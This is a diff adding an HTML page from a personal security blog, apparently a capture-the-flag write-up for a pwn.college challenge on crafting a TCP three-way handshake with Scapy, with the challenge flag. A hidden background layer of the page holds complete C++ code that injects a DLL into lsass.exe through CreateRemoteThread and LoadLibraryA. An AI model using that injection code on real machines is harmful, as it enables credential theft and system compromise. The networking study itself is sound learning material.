@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🤝 TCP Three-Way Handshake — pwn.college</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🤝 TCP Three-Way Handshake — pwn.college" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🤝 TCP Three-Way Handshake — pwn.college</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-task">📝 Task</h2>
+
+<p><strong>Objective:</strong><br />
+Manually perform a TCP handshake with:</p>
+
+<ul>
+  <li><strong>Source Port:</strong> <code class="language-plaintext highlighter-rouge">31337</code></li>
+  <li><strong>Destination Port:</strong> <code class="language-plaintext highlighter-rouge">31337</code></li>
+  <li><strong>Initial Sequence Number:</strong> <code class="language-plaintext highlighter-rouge">31337</code></li>
+  <li><strong>Destination IP:</strong> <code class="language-plaintext highlighter-rouge">10.0.0.2</code></li>
+</ul>
+
+<hr />
+
+<h2 id="-packet-flow">🔧 Packet Flow</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Packet</th>
+      <th>Flags</th>
+      <th>Fields</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>SYN</td>
+      <td><code class="language-plaintext highlighter-rouge">'S'</code></td>
+      <td><code class="language-plaintext highlighter-rouge">seq = x</code></td>
+    </tr>
+    <tr>
+      <td>SYN-ACK</td>
+      <td><code class="language-plaintext highlighter-rouge">'SA'</code></td>
+      <td><code class="language-plaintext highlighter-rouge">seq = y</code>, <code class="language-plaintext highlighter-rouge">ack = x + 1</code></td>
+    </tr>
+    <tr>
+      <td>ACK</td>
+      <td><code class="language-plaintext highlighter-rouge">'A'</code></td>
+      <td><code class="language-plaintext highlighter-rouge">seq = x + 1</code>, <code class="language-plaintext highlighter-rouge">ack = y + 1</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="-solution-using-scapy">🧪 Solution using Scapy</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">t_ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10.0.0.2</span><span class="sh">"</span>
+
+<span class="c1"># Step 1: Send SYN
+</span><span class="o">&gt;&gt;&gt;</span> <span class="n">syn</span> <span class="o">=</span> <span class="nc">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">t_ip</span><span class="p">)</span><span class="o">/</span><span class="nc">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="sh">'</span><span class="s">S</span><span class="sh">'</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="mi">31337</span><span class="p">)</span>
+
+<span class="c1"># Step 2: Receive SYN-ACK
+</span><span class="o">&gt;&gt;&gt;</span> <span class="n">synack</span> <span class="o">=</span> <span class="nf">sr1</span><span class="p">(</span><span class="n">syn</span><span class="p">)</span>
+
+<span class="c1"># Step 3: Send ACK
+</span><span class="o">&gt;&gt;&gt;</span> <span class="n">ack</span> <span class="o">=</span> <span class="nc">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">t_ip</span><span class="p">)</span><span class="o">/</span><span class="nc">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="n">syn</span><span class="p">.</span><span class="n">seq</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ack</span><span class="o">=</span><span class="n">synack</span><span class="p">.</span><span class="n">seq</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">send</span><span class="p">(</span><span class="n">ack</span><span class="p">)</span>
+<span class="p">.</span>
+<span class="n">Sent</span> <span class="mi">1</span> <span class="n">packets</span><span class="p">.</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{8yDXHISTkr5Byf9rT4RgjEcscFy.QX5YzMzwSM0IzMyEzW}
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
